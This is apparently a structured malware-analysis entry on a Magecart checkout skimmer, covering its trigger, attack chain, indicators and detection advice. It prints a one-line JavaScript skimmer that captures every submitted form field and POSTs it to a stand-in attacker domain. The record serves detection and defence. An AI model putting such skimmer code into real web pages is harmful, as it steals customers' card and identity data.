package_info.why_malicious: The Magecart skimmer is malicious because it is injected into e-commerce websites to surreptitiously steal customers’ personal and financial information by intercepting and exfiltrating payment data during the checkout process, resulting in large-scale theft of credit card and identity data.

execution_context.trigger: At runtime, when a user submits the payment form on the checkout page
execution_context.file_location: Injected JavaScript within the HTML source of the checkout/payment page
required_permissions: Access to the DOM to read form fields
Ability to initiate outbound network requests (fetch/XHR)

malicious_snippets.code_snippet: document.querySelector('form').addEventListener('submit', function(e) { var data = new FormData(this); fetch('https://malicious-domain.com/collect', { method: 'POST', body: data }); });
malicious_snippets.code_behavior: At runtime, when the user submits the payment form, the code attaches an event listener to the form submission event, collects all form data (including payment and personal details), and sends this data via an HTTPS POST request to a hardcoded external domain controlled by the attacker, resulting in exfiltration of sensitive information.

malice_analysis.why_suspicious: The code intercepts sensitive payment form submissions and exfiltrates the entire form data to an untrusted, attacker-controlled domain, which is a hallmark of web skimming attacks.
malice_analysis.violated_expectations: Legitimate e-commerce JavaScript should only transmit payment data to trusted, whitelisted payment processors or merchant servers, never to unknown or untrusted third-party domains.
malice_analysis.similar_legitimate_use: Legitimate scripts may send form data to payment gateways or fraud detection services, but only to domains that are explicitly trusted and verified by the merchant.
key_indicators: Event listener attached to payment form submission
Use of FormData to capture all user input fields
Outbound fetch/XHR POST request to a hardcoded, untrusted external domain
No user notification or consent for data transmission
Domain used for exfiltration is not associated with the merchant or payment processor

attack_chain.action: Attacker injects malicious JavaScript into the checkout page of the e-commerce site, either by compromising the site directly or via a third-party dependency.
attack_chain.leads_to: Malicious code is loaded and executed in the browsers of customers during the checkout process.

attack_chain.action: The injected JavaScript attaches an event listener to the payment form, intercepts the form submission, collects all entered data, and sends it to an attacker-controlled server.
attack_chain.leads_to: Attacker receives stolen payment and personal data in real time, enabling credit card theft and potential identity fraud.

behavioral_signatures: JavaScript code intercepting form submissions specifically on checkout or payment pages
Outbound network requests (fetch/XHR) from payment pages to domains not associated with the merchant or known payment processors
Unexpected collection and transmission of full form data, including payment and PII fields, to external destinations
file_indicators: Presence of injected or obfuscated JavaScript within the HTML source of checkout or payment pages
References to external scripts or resources loaded from non-whitelisted or newly registered domains in payment page HTML
network_indicators: HTTPS POST requests originating from checkout or payment pages to domains not owned by the merchant or payment processor
Outbound traffic to domains known for skimming activity or recently registered domains with no prior association to the merchant
Unusual spikes in POST requests containing form-encoded or multipart data during checkout events
detection_knowledge.how_to_detect: Continuously monitor e-commerce checkout and payment pages for unauthorized or injected JavaScript, especially code that attaches event listeners to form submissions and sends data to external domains. Implement network monitoring to detect outbound POST requests containing payment or PII data to untrusted or non-whitelisted destinations. Regularly scan and compare site code against known-good baselines to identify unauthorized changes. Flag any references to external scripts from unknown domains and investigate any new or unrecognized domains receiving data from checkout pages.
